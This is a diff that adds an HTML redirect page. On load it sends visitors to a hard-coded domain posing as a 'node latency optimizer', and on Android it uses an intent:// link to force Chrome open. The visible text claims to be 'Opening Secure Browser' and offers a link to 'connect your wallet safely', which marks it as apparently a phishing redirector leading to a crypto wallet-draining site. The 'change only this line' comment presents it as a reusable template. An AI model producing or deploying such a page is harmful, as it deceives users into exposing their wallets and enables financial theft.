@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting safely...</title>
+    <script>
+        // CHANGE ONLY THIS LINE BELOW:
+        var targetUrl = "https://api.node-latency-optimizer.it.com"; 
+
+        window.onload = function() {
+            var cleanUrl = targetUrl.replace(/^https?:\/\//, '');
+            var isAndroid = /Android/i.test(navigator.userAgent);
+            var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+            // Update the fallback link in the body automatically
+            document.getElementById("fallback-link").href = targetUrl;
+
+            if (isAndroid) {
+                window.location.href = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
+            } else if (isIOS) {
+                window.location.href = targetUrl;
+                setTimeout(function() { window.location.replace(targetUrl); }, 250);
+            } else {
+                window.location.href = targetUrl;
+            }
+        };
+    </script>
+</head>
+<body style="font-family:sans-serif; text-align:center; padding-top:50px; background:#f9f9f9;">
+    <h2>Opening Secure Browser...</h2>
+    <p>Please wait. If it stays stuck, <a id="fallback-link" href="#">click here to connect your wallet safely</a>.</p>
+</body>
+</html>
